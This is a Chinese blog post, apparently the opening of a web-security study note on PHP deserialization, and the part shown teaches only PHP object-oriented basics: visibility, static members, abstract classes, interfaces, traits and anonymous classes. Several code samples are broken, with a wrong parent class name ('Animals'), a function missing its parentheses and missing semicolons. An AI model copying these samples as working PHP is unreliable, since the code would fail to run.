
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Web_6_反序列化 - Charmersix</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="第一节 php基础、类与对象读文档类与对象
0x1 php中的面向对象在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
    
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="Web_6_反序列化 - Charmersix"/>
    <meta name="twitter:description" content="第一节 php基础、类与对象读文档类与对象
0x1 php中的面向对象在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单,"/>
    
    
    
    
    <meta property="og:site_name" content="Charmersix"/>
    <meta property="og:type" content="object"/>
    <meta property="og:title" content="Web_6_反序列化 - Charmersix"/>
    <meta property="og:description" content="第一节 php基础、类与对象读文档类与对象
0x1 php中的面向对象在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单,"/>
    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body class="loading">
    <span id="config-title" style="display:none">Charmersix</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">Web_6_反序列化</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">Web_6_反序列化</h1>
        <div class="stuff">
            <span>十月 20, 2022</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Study/" rel="tag">Study</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/unserialize/" rel="tag">unserialize</a></li></ul>


        </div>
        <div class="content markdown">
            <h2 id="第一节-php基础、类与对象"><a href="#第一节-php基础、类与对象" class="headerlink" title="第一节 php基础、类与对象"></a>第一节 php基础、类与对象</h2><p>读文档类与对象</p>
<h3 id="0x1-php中的面向对象"><a href="#0x1-php中的面向对象" class="headerlink" title="0x1 php中的面向对象"></a>0x1 php中的面向对象</h3><p>在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单独函数来完成特定功能的语言模式，我们叫做面向过程编程。面向过程编程方法的优势是代码简单，开发迅速，不足之处就是如果功能、逻辑、数据进行大量的增长，这时候，代码维护难度将会成倍的增加，扩展性、可移植性就大大降低。</p>
<p>于是以Java为代表的面向对象编程顺势而出，解决了复杂逻辑空间下的编码模式问题，php在最开始的纯面向过程逐步向面向对象模式改进，在保持其一贯的简单易学、编码快速的优势下，同向对象之间取得平衡。</p>
<h4 id="面向对象的思想"><a href="#面向对象的思想" class="headerlink" title="面向对象的思想"></a>面向对象的思想</h4><p>面向对象的设计思想主要有</p>
<ol>
<li>系统中一切事物皆为对象</li>
<li>对象是属性及其操作的封装体</li>
<li>对象可按其性质划分为类，对象成为类的实例</li>
<li>实例关系和继承关系是对象之间的静态关系</li>
<li>消息传递是对象之间动态联系的唯一形式，也是计算的唯一形式</li>
<li>方法是消息的序列</li>
</ol>
<h4 id="php面向对象的特点"><a href="#php面向对象的特点" class="headerlink" title="php面向对象的特点"></a>php面向对象的特点</h4><p>面向对象三大特征：<code>封装、继承、多态</code></p>
<h5 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h5><p>在面向对象的思路上，功能相似的函数集合在一起</p>
<p>将完成一个共同功能的函数集中起来就是聚类</p>
<h5 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h5><p>功能封装，数据封装，供内部各个方法使用</p>
<h5 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h5><p>调用对象从一个蓝图转换到一个可以使用的产品的过程叫做实例化</p>
<p>俩个实例之间的属性不能互相访问，在对象内部，也不能直接访问外部的变量。</p>
<h5 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h5><p>继承可以理解为对象的包含，在php中可以使用<code>extends</code>关键字继承类</p>
<h5 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h5><p>在php中是弱类型,在参数传递过程中,可以改变参数的对象类型,作为对象依然是可以传递进去,当同一个参数由不同对象实例传递,那么调用结果就实现不同的状态</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们有一个command类，她有一个run方法，会执行参数run方法，然后我们有两个其他对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;兔子跑了&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Script</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;脚本已启动&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Rabbit</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Script</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>

<h3 id="0x2-类与对象"><a href="#0x2-类与对象" class="headerlink" title="0x2 类与对象"></a>0x2 类与对象</h3><h4 id="类的属性和方法权限"><a href="#类的属性和方法权限" class="headerlink" title="类的属性和方法权限"></a>类的属性和方法权限</h4><p>在php中，类的属性和方法权限有三个权限，分别为</p>
<ul>
<li>public</li>
<li>protected</li>
<li>private</li>
</ul>
<h5 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h5><p>被定义为公有类成员可以在任何地方被访问</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"><span class="variable">$command</span>-&gt;cmd=<span class="string">&quot;whoami&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里用箭头来指向类的属性，箭头之后，不需要$符号</p>
<p>也可以使用<code>var</code>来定义类属性,如果使用<code>var</code>定义则默认<code>public</code>权限</p>
<h5 id="protected权限"><a href="#protected权限" class="headerlink" title="protected权限"></a>protected权限</h5><p>被定义为受保护的类成员则可以被其自身以及其子类和父类访问</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getColor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;color</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>color</code>属性可以被子类继承并访问</p>
<h5 id="private权限"><a href="#private权限" class="headerlink" title="private权限"></a>private权限</h5><p>私有属性,只能在类自身中访问,其他位置不能访问,包括继承它的类</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正确，类实例可以访问到自身的私有属性</span></span><br><span class="line"><span class="variable">$animal</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$animal</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例不能访问父类私有属性</span></span><br><span class="line"><span class="variable">$human</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$human</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例调用不了父类的私有方法</span></span><br><span class="line"><span class="variable">$human</span>-&gt;<span class="title function_ invoke__">sleep</span>();</span><br></pre></td></tr></table></figure>

<h4 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h4><p>属性声明是由关键字public、protected或者private开头，然后跟一个普通的变量声明来组成。属性中的变量可以初始化，但初始化的值必须是常数，这里的常数是指PHP脚本在编译阶段时就可以得到其值，而不依赖于运行时的信息才能求值。</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panda&quot;</span>; <span class="comment">#初始化</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h5><p>指不用实例化类对象，直接通过类名访问的属性或者方法</p>
<p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问(但静态方法可以)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//这里直接通过类名调用，不需要实例化</span></span><br><span class="line">    <span class="title class_">Animal</span>::<span class="title function_ invoke__">sleep</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//使用双冒号指向静态属性</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//子类也可以直接访问到父类的静态方法</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="final属性"><a href="#final属性" class="headerlink" title="final属性"></a>final属性</h5><p>如果代码中有<code>final</code>关键字就不允许子类重写父类,如果子类强制重写父类就会报错</p>
<h4 id="类的分类"><a href="#类的分类" class="headerlink" title="类的分类"></a>类的分类</h4><p>前面我们定义类的时候,没有修饰,类也是可以有不同的修饰符号的</p>
<h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><p>使用<code>abstract</code>关键字定义抽象类</p>
<p>定义为抽象的类不能被实例化.任何一个类,如果它里面至少有一个方法是被声明为抽象的,那么这个类就必须被声明为抽象的.被定义为抽象的方法只是声明了其调用方式(参数),不能定义其具体的功能实现.</p>
<p>继承一个抽象类的时候,子类必须定义父类中的所有抽象方法;另外,这些方法的访问控制必须和父类中的一样(或者更为宽松).例如某个抽象方法被声明为受保护 的,那么子类中实现的方法就应该声明为受保护的或者公有的,而不能被定义为私有的.此外方法的调用方式必须匹配,即类型和所需参数数量必须一致.例如,子类定义了一个可选参数,而父类抽象方法的声明里没有,则两者的声明并无冲突.</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;in bed&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;on tree&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>抽象类的作用是保证他的子类都有指定的共同方法,方便外部调用,而不关心内部的具体实现</p>
<p>总之:</p>
<ul>
<li>抽象类不能实例化,只能实例化子类</li>
<li>抽象类可以有具体方法,但至少应该有一个抽象方法</li>
<li>继承抽象类的子类必须实现抽象类的所有抽象方法</li>
</ul>
<h5 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h5><p>使用<code>interface</code>来定义,很像抽象类</p>
<p>使用接口(interface),可以指定某个类必须实现哪些方法,但不需要定义这些方法的具体内容.其中定义的所有的方法都是空的</p>
<p>接口中定义的所有方法都必须是公有的,这是接口的特性</p>
<p>要实现一个接口,使用<code>implements</code>操作符.类中必须实现接口中定义的所有方法,否则会报一个致命错误.类可以实现多个接口,用逗号来分隔多个接口的名称.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">a</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">c</span> <span class="keyword">extends</span> <span class="title">a</span> ,<span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> <span class="keyword">implements</span> <span class="title">c</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口允许继承,实现接口,也允许实现多个接口</p>
<h5 id="trait"><a href="#trait" class="headerlink" title="trait"></a>trait</h5><p>PHP5.4起,PHP实现了一种代码复用的方法,为trait</p>
<p>Trait 是为类似php单继承语言而备用的一种代码复用机制.Trait 为了减少单继承语言的限制,使开发人员能够自由地在不同层次结构内独立的类中复用method. Trait 和 class组合的语义定义了一种减少复杂性的方式,避免传统多继承和Mixin类相关典型问题.</p>
<p>Trait 和 Class 相似,但仅仅旨在用细粒度和一致的方式来组合功能. 无法通过Trait 自身来实例化. 它为传统继承增加了水平特性的组合; 也就是说应用的几个Class之间不需要继承.</p>
<p>trait 是可以组合的,由多个trait构成一个新的trait</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayHello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">World</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayWorld</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">World</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">HelloWorld</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MyHelloWorld</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayHello</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayWorld</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>trait配合接口或者抽象类</p>
<h5 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h5><p>匿名类是为了解决临时实现某个抽象类或者接口类实例用的</p>
<p>匿名类我们关注的点是临时执行下我们自定义的run方法,这个类其他地方也用不到,所以我们不需要给它专门起名定义,占用代码行数,反正Command类的run方法关心的是传入的对象有没有run方法,而不关心传入的对象叫什么名字. </p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span> -&gt; <span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span> (<span class="keyword">new</span> <span class="keyword">class</span>&#123;</span><br><span class="line">  function <span class="title function_ invoke__">run</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;临时用的所以不起名字&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

